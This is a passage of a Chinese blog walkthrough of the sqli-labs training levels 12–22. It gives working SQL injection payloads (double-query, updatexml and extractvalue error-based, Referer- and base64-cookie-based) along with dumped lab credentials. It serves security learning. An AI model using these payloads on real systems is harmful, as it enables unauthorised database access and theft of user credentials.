punctuation\">,</span>stupidity<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>superman<span class=\"token punctuation\">,</span>genious<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>batman<span class=\"token punctuation\">,</span>mob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">,</span>admin1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">,</span>admin2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">,</span>admin3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>dhakkan<span class=\"token punctuation\">,</span>dumbo<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">,</span>admin4<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Less-13\">Less-13<a href=\"post/sqli-labs#Less-13\"></a></h2><ol>\n<li><strong>判断注入类型</strong><br><code>username 输入 admin&#39;\npassword 输入 任意内容</code><br>回显报错：<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39;) LIMIT 0,1&#39; at line 1</code><br>得知后面还有一个括号，本以为将Less-12的双引号<code>&quot;</code>改成单引号<code>&#39;</code>就可以了，但是这个题没有报错。</li>\n<li><strong>爆破数据库名</strong><br>方法一：二分法<br>方法二：双查询报错<br><code>uname=1&amp;passwd=1&#39;) union select count(*),concat(&quot;~~&quot;,(select database()),&quot;~~&quot;,floor(rand()*2))as a from information_schema.tables group by a#</code><br>回显：<br><code>Duplicate entry &#39;~~security~~1&#39; for key &#39;group_key&#39;</code><br>得到数据库名是<code>security</code></li>\n<li><strong>猜测数据表名</strong><br><code>uname=1&amp;passwd=1&#39;) union select count(*),concat(&quot;~~&quot;,(select table_name from information_schema.tables where table_schema=database() limit 3,4),&quot;~~&quot;,floor(rand()*2))as a from information_schema.tables group by a#</code><br>不断更改limit的值就可以了。<br>回显：<br><code>Duplicate entry &#39;~~users~~1&#39; for key &#39;group_key&#39;</code><br>4.<strong>爆破数据</strong><br>不断更改limit值即可<br><code>uname= &#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#39;) or 1=1 #</code></li>\n</ol>\n<h2 id=\"Less-14\">Less-14<a href=\"post/sqli-labs#Less-14\"></a></h2><ol>\n<li><strong>猜测注入类型</strong><br><code>username 输入 admin&quot;\npassword 输入 任意</code><br>实际上就是将上一题的<code>&#39;)</code>改为<code>&quot;</code>即可。</li>\n<li><strong>爆破数据</strong><br><code>uname= &quot; union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#39;) or 1=1 #</code><br>不断更改limit即可。</li>\n</ol>\n<h2 id=\"Less-15\">Less-15<a href=\"post/sqli-labs#Less-15\"></a></h2><ol>\n<li><strong>注入类型判断</strong><br><code>uname=admin&#39; or &#39;1&#39;=&#39;1</code><br>回显成功，但是根据题目提示，最后判为延时型的注入。</li>\n<li><strong>爆破数据</strong><br>借助于Less-13即可</li>\n</ol>\n<h2 id=\"Less-16\">Less-16<a href=\"post/sqli-labs#Less-16\"></a></h2><ol>\n<li>判断注入类型 构造语句<code>uname=admin&quot;)</code>判断出是双引号加括号的注入，但是不报错。后来看了源码，是基 于时间错误的注入。</li>\n<li>爆破数据 借助于Less-13即可。</li>\n</ol>\n<h2 id=\"Less-17\">Less-17<a href=\"post/sqli-labs#Less-17\"></a></h2><ol>\n<li>判断错误类型 这个题实在是找不到是啥注入，后来看了源码，首先有个过滤函数，<code>check_input</code>、<code>check_input</code>首先判断不为空，就截取前15个字符，当<code>magic_quotes_gpc=On</code>的时候，函数 <code>get_magic_quotes_gpc()</code>就会返回1。当<code>magic_quotes_gpc=Off</code>的时候，函数 <code>get_magic_quotes_gpc()</code>就会返回0。 <code>magic_quotes_gpc</code>函数在php中的作用是判断解析用户提示的 数据，如包括有:<code>post、get、cookie</code>过来的数据增加转义字符\\，以确保这些数据不会引起程序，特别是数据库 语句因为特殊字符引起的污染而出现致命的错误。若开了就将转义符去掉。 <code>ctype_digit</code>判断是不是数字， 是数字就返回<code>true</code>，否则返回<code>false</code>。是字符就用<code>mysql_real_escape_string</code>过滤，其实基本就是转义 （转义SQL语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集），这样就把宽字节cut了。是数 字也要用intval转化成int，因为传过来的是字符型数字。</li>\n<li><p>爆破数据库名 <code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>得到： <code>XPATH syntax error: &#39;~security~&#39;</code></p>\n</li>\n<li><p>爆破数据表名 <code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</code>得到： <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>\n</li>\n<li><p>爆破数据 <code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e),1)#</code></p>\n</li>\n</ol>\n<h2 id=\"Less-18\">Less-18<a href=\"post/sqli-labs#Less-18\"></a></h2><ol>\n<li>判断注入类型 查看了一下源码，得知这个题启用了代理。</li>\n<li>爆破数据表名 参考Less-5 <code>1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x7e),1) and &#39;1&#39;=&#39;1</code>即可得到数据。</li>\n</ol>\n<h2 id=\"Less-19\">Less-19<a href=\"post/sqli-labs#Less-19\"></a></h2><ol>\n<li><p>判断注入类型 查看了源码，这关跟18关差不多，就是有点稍微的变化，这关改的是Referer。</p>\n</li>\n<li><p>查数据表名 把Referer改为：<code>&#39;or updatexml(&#39;1&#39;,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1)),0),&#39;~&#39;)#</code></p>\n</li>\n<li><p>爆破数据 把Referer改为：<code>&#39;or extractvalue(1,concat(&#39;~&#39;,(select\nconcat(&#39;~&#39;,username,password) from users limit 1,1))),&#39;&#39;)#</code> 即可。</p>\n</li>\n</ol>\n<h2 id=\"Less-20\">Less-20<a href=\"post/sqli-labs#Less-20\"></a></h2><ol>\n<li>判断错误类型 查看了源码发现跟上题差不多，只不过是将Referer改为Cookie即可了。</li>\n<li>爆破数据 使用 burpsuite-reperter 抓包添加一行 cookie 值，将Cookie值设置为<code>uname=1&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</code>即可。</li>\n</ol>\n<h2 id=\"Less-21\">Less-21<a href=\"post/sqli-labs#Less-21\"></a></h2><ol>\n<li>判断错误类型 查看了一下源代码，本关对 cookie 进行了 base64 的处理，其他的处理流程和 less20 是一样 的。 我们这里可以利用 less20 同样的方法，但是需要将 payload 进行 base64 编码处理（注意这里对uname 进行了(‘uname’)的处理） Cookie： <code>uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2Vka XIpLDB4N2UpKSM=</code> 在浏览器输入正确的用户名和密码 <code>admin:admin</code> 修改 cookie 值为<code>uname=admin1&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</code>。接着使用上一题的方法即可。</li>\n</ol>\n<h2 id=\"Less-22\">Less-22<a href=\"post/sqli-labs#Less-22\"></a></h2><ol>\n<li>判断错误类型 插卡看源代码，Cookie 处理方式和上题是一样的，都用了 base64 编码，唯一的不同是闭合方 式变成了双引号。 <code>admin1&quot;and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code> base64 编码之后：cookie： <code>YWRtaW4xImFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB 4N2UpKSM=</code> 最后更改闭合方式结合less20、less21 可以构造payload即可。</li>\n</ol>\n","prev":{"title":"Network attack and defense","link":"post/Network-attack-and-defense"},"next":{"title":"浅谈 C 和其他语言","link":"post/c-grammer"},"plink":"https://Directoree.github.io/post/sqli-labs/","toc":[{"title":"Less-1","id":"Less-1","index":"1"},{"title":"Less-2","id":"Less-2","index":"2"},{"title":"Less-3","id":"Less-3","index":"3"},{"title":"Less-4","id":"Less-4","index":"4"},{"title":"Less-5","id":"Less-5","index":"5"},{"title":"<strong>Less-6</strong>","id":"Less-6","index":"6"},{"title":"<strong>Less-7</strong>","id":"Less-7","index":"7"},{"title":"Less-8","id":"Less-8","index":"8"},{"title":"Less-9","id":"Less-9","index":"9"},{"title":"Less-10","id":"Less-10","index":"10"},{"title":"Less-11","id":"Less-11","index":"11"},{"title":"Less-12","id":"Less-12","index":"12"},{"title":"Less-13","id":"Less-13","index":"13"},{"title":"Less-14","id":"Less-14","index":"14"},{"title":"Less-15","id":"Less-15","index":"15"},{"title":"Less-16","id":"Less-16","index":"16"},{"title":"Less-17","id":"Less-17","index":"17"},{"title":"Less-18","id":"Less-18","index":"18"},{"title":"Less-19","id":"Less-19","index":"19"},{"title":"Less-20","id":"Less-20","index":"20"},{"title":"Less-21","id":"Less-21","index":"21"},{"title":"Less-22","id":"Less-22","index":"22"}],"reward":true,"copyright":{"author":"Directoree","link":"<a href=\"https://Directoree.github.io/post/sqli-labs/\" title=\"sqli-labs\">https://Directoree.github.io/post/sqli-labs/</a>","license":"Attribution-NonCommercial-NoDerivatives 4.0 International (<a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\" rel=\"external nofollow noopener\" target=\"_blank\">CC BY-NC-ND 4.0</a>)"}}